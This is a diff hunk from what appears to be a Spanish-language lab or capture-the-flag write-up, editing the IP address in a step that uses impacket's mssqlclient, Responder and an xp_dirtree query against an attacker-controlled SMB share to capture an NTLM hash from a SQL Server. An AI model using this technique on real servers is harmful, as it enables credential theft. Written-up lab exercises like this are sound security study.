@@ -141,7 +141,7 @@ usando `mssqlclient` de la suite de impacket podemos establecer conexión en la 
 ### responder 
 vamos a iniciar el responder para intentar obtener un hash. si intentamos listar los archivos y directorios en nuestra maquina y estos no existen la base de datos debería de darnos un hash
 ```python
-EXEC MASTER.sys.xp_dirtree '\\10.10.14.14\test', 1, 1
+EXEC MASTER.sys.xp_dirtree '\\10.10.10.10\test', 1, 1
 ```
 ![[Pasted image 20240328222914.png]]
 
